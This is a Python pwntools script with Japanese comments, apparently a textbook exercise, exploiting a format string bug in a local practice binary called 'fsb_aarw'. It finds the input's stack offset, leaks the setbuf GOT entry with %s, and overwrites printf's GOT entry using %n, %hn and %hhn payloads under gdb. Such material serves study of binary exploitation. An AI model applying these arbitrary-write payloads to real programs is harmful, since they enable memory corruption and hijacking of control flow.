#!/usr/bin/env python3

# gdbを使用するため、リモート接続してGUI画面上で実行すること

# $ python3 ./exploit_fsb_aarw.py

from pwn import *
import sys
import struct

bin_file = './fsb_aarw'
binf = ELF(bin_file)

# GDBスクリプト（起動時に実行されるコマンド）
gdb_script = '''
continue
'''

# ユーザの入力の位置確認
def attack_35_19(conn, **kwargs):
    exploit = 'aaaaaaaa %p %p %p %p %p %p %p %p %p'  # aaaaaaaaが何番目に表示されるか調べる
    conn.sendline(exploit)
    print(conn.recvall().decode())                   # 0x6161616161616161(aaaaaaaa)が9番目に表示される

# 設定した値の確認
def attack_35_20(conn, **kwargs):
    exploit = b'%9$p'.ljust(8, b'\x00')              # 9番目の書式文字列 (スタックに積むため8byte単位にアライメント)
    exploit += struct.pack('<Q', binf.got['setbuf']) # setbufのGOTテーブルのアドレス (スタックに積むため8byte単位にアライメント)
    conn.sendline(exploit)                           # fsb_aarwのbufに書き込む→printf('%9$p',setbufのGOTテーブルのアドレス)となる
    print(conn.recvall().decode())                   # setbufのGOTテーブルのアドレス(0x404020)が表示される

# GOTの読み出し（%sをつけて読み出す）
def attack_35_21(conn, **kwargs):
    exploit = b'%9$s'.ljust(8, b'\x00')              # 9番目の書式文字列 (スタックに積むため8byte単位にアライメント)
    exploit += struct.pack('<Q', binf.got['setbuf']) # setbufのGOTテーブルのアドレス (スタックに積むため8byte単位にアライメント)
    conn.sendline(exploit)                           # fsb_aarwのbufに書き込む→printf('%9$s',setbufのGOTテーブルのアドレス)となる
    print(conn.recvall().hex())                      # setbufのアドレスをリークできる

# printfのGOTテーブルのアドレスに、0x102(4byte)を書き込む
def attack_35_23(conn, **kwargs):
    """
    0x102=258のため、9番目の書式文字列に%nで出力文字数を書き込むためには、'%258c%9$n'とすればよいが、9文字のため8バイトを超える。
    そのため、スタックに積むとき、8バイトアライメントがずれるので、'%258c%10$n'として、16バイト横詰めにする
    """
    exploit = b'%258c%10$n'.ljust(0x10, b'\x00')
    exploit += struct.pack('<Q', binf.got['printf']) # printfのGOTテーブルのアドレス (スタックに積むため8byte単位にアライメント)
    conn.sendline(exploit)
    conn.recvall()

# printfのGOTテーブルのアドレスに、0x12345678(4byte)を書き込む (出力文字数が多いので、時間かかる)
def attack_35_24(conn, **kwargs):
    # 305419896=0x12345678。%305419896cで、0x12345678文字出力し、%10$nで10個目の引数に出力文字数0x12345678書き込み
    exploit = b'%305419896c%10$n'.ljust(0x10, b'\x00')
    exploit += struct.pack('<Q', binf.got['printf'])
    conn.sendline(exploit)
    conn.recvall()

# printfのGOTテーブルのアドレスに、0x12345678(8byte)を書き込む
def attack_35_26(conn, **kwargs):
    exploit = b'%18c%17$hhn%34c%16$hhn%34c%15$hhn%34c%14$hhn'.ljust(0x30, b'\x00')
    exploit += struct.pack('<QQQQ', binf.got['printf'], binf.got['printf']+1, binf.got['printf']+2, binf.got['printf']+3)
    conn.sendline(exploit)
    conn.recvall()

# printfのGOTテーブルのアドレスに、0x12345678(8byte)を書き込む
def attack_35_27(conn, **kwargs):
    exploit = b'%13$ln%86c%14$hhn%34c%13$hhn%4540c%15$hn'.ljust(0x28,b'\x00')
    exploit += struct.pack('<QQQ', binf.got['printf'], binf.got['printf']+1, binf.got['printf']+2)
    conn.sendline(exploit)
    conn.recvall()

def main():
    conn = process(bin_file)
    attack_35_19(conn)
    
    conn = process(bin_file)
    attack_35_20(conn)
    
    conn = process(bin_file)
    attack_35_21(conn)
    
    conn = gdb.debug(bin_file, gdbscript=gdb_script)
    attack_35_23(conn)
    
    conn = gdb.debug(bin_file, gdbscript=gdb_script)
    attack_35_24(conn)
    
    conn = gdb.debug(bin_file, gdbscript=gdb_script)
    attack_35_26(conn)
    
    conn = gdb.debug(bin_file, gdbscript=gdb_script)
    attack_35_27(conn)
    
if __name__=='__main__':
    main()
